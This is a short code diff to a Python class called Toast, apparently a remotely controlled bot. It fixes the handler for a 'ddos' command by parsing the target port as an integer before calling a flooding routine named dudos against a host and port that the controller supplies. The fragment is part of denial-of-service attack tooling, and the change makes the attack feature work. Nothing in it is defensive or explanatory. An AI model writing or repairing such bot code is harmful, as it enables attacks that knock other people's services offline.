@@ -28,7 +28,7 @@ class Toast(BaseResponder):
 
 			if cmd == 'ddos' and params:
 				host, port = params.split(':')
-				self.dudos(sock=msg, host=host, port=port)
+				self.dudos(sock=msg, host=host, port=int(port))
 			elif cmd == 'quit':
 				self.respond(msg, 'Bye!')
 				exit()
